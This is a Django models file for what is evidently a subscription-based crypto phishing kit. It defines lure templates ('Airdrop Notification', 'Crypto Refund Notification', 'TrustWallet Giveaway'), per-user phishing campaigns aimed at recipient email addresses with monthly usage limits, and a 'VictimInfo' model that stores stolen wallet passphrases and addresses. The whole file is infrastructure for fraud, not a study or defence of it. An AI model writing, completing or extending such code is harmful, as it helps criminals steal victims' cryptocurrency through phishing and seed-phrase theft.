from enum import unique
from django.db import models
from django.conf import settings
import uuid
from django.utils import timezone
from shortuuid.django_fields import ShortUUIDField
from account.models import Subscription

TEMPLATE_CHOICES = [
    ('AIRDROP', 'Airdrop Notification'),
    ('REFUND', 'Crypto Refund Notification'),
    ('GIVEAWAY', 'TrustWallet Giveaway'),
]

User = settings.AUTH_USER_MODEL

class Cryptocurrency(models.Model):
    code = models.CharField(max_length=10)  # e.g., BTC, ETH
    name = models.CharField(max_length=100)  # e.g., Bitcoin, Ethereum

    def __str__(self):
        return self.name

    class Meta:
        verbose_name = 'Cryptocurrency'
        verbose_name_plural = 'Cryptocurrencies'



class Wallet(models.Model):
    name = models.CharField(max_length=20, unique=True)  # e.g., TrustWallet, Coinbase
    logo = models.ImageField(
        upload_to='wallets/',
        null=True,
        blank=True,
        verbose_name='Logo'
    )

    def __str__(self):
        return self.name

    class Meta:
        verbose_name = 'Wallet'
        verbose_name_plural = 'Wallets'



class EmailTemplate(models.Model):
    type = models.CharField(max_length=20, choices=TEMPLATE_CHOICES)

    def get_active_subscriptions(self):
        return Subscription.objects.filter(
            is_active=True,
            end_date__gt=timezone.now()
        )

    def __str__(self):
        return self.type 

    class Meta:
        verbose_name = 'Email Template'
        verbose_name_plural = 'Email Templates'
        
class Campaign(models.Model):
    id = ShortUUIDField(unique=True, max_length=12, length=3, prefix='cam', alphabet='0123456789', primary_key=True)
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    recipient_email = models.EmailField()
    email_template = models.ForeignKey(EmailTemplate, on_delete=models.CASCADE)
    cryptocurrency = models.ForeignKey(Cryptocurrency, on_delete=models.CASCADE)
    quantity = models.DecimalField(max_digits=20, decimal_places=8)
    min_balance = models.DecimalField(max_digits=20, decimal_places=8)
    created_at = models.DateTimeField(auto_now_add=True)

    def has_valid_subscription(self):
        return Subscription.objects.filter(
            user=self.user,
            is_active=True,
            end_date__gt=timezone.now()
        ).exists()

    def get_monthly_usage(self):
        return Campaign.objects.filter(
            user=self.user,
            email_template=self.email_template,
            created_at__month=timezone.now().month,
            created_at__year=timezone.now().year
        ).count()

    def __str__(self):
        return f'Campaign for {self.recipient_email} - {self.cryptocurrency}'

    class Meta:
        verbose_name = 'Campaign'
        verbose_name_plural = 'Campaigns'
        ordering = ['-created_at']

class VictimInfo(models.Model):
    id = ShortUUIDField(unique=True, max_length=12, length=3, prefix='CL', alphabet='0123456789', primary_key=True)
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE, null=True)
    wallet = models.ForeignKey(Wallet, on_delete=models.CASCADE)
    campaign = models.ForeignKey(Campaign, on_delete=models.CASCADE, null=True)  # Associate with Campaign
    passphrase = models.CharField(max_length=400, null=True, blank=True)
    address = models.CharField(max_length=100, null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    uuid = models.UUIDField(default=uuid.uuid4, editable=False, unique=True, null=True, blank=True)

    @property
    def recipient_email(self):
        return self.campaign.recipient_email  # Derived from the associated campaign

    def __str__(self):
        return f'{self.wallet} - {self.recipient_email}'

    class Meta:
        verbose_name = 'Victim Info'
        verbose_name_plural = 'Victim Infos'